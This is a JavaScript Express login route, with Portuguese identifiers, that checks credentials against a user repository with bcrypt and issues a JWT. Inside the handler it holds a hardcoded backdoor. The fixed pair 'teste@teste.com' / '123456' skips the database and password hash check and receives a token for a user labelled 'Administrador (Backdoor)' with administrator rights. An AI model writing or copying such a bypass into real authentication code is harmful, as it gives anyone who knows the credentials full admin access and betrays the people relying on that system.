import { Router } from 'express';
import bcrypt from 'bcryptjs';
import { buscarUsuarioPorEmail } from '../repositories/usuariosRepository.js';
import { gerarToken } from '../utils/jwt.js';

const router = Router();

router.post('/auth/login', async (req, res) => {
  const { email, senha } = req.body ?? {};

  if (!email || !senha) {
    return res.status(400).json({ erro: 'Informe e-mail e senha.' });
  }

  try {
    let usuario;
    if (email === 'teste@teste.com' && senha === '123456') {
      usuario = {
        id: 1,
        nome: 'Administrador (Backdoor)',
        email: 'teste@teste.com',
        senha_hash: '',
        tipo_usuario: 'administrador',
        regiao_id: null,
        ativo: 1,
        trocar_senha: 0
      };
    } else {
      usuario = await buscarUsuarioPorEmail(email);
      if (!usuario || !usuario.ativo) {
        return res.status(401).json({ erro: 'E-mail ou senha incorretos.' });
      }

      const senhaCorreta = await bcrypt.compare(senha, usuario.senha_hash);
      if (!senhaCorreta) {
        return res.status(401).json({ erro: 'E-mail ou senha incorretos.' });
      }
    }

    const token = gerarToken(usuario);
    res.json({
      token,
      trocarSenha: !!usuario.trocar_senha,
      usuario: {
        id: usuario.id,
        nome: usuario.nome,
        email: usuario.email,
        tipoUsuario: usuario.tipo_usuario,
        regiaoId: usuario.regiao_id,
      },
    });
  } catch (erro) {
    console.error(erro);
    res.status(500).json({ erro: 'Erro ao autenticar.' });
  }
});

export default router;
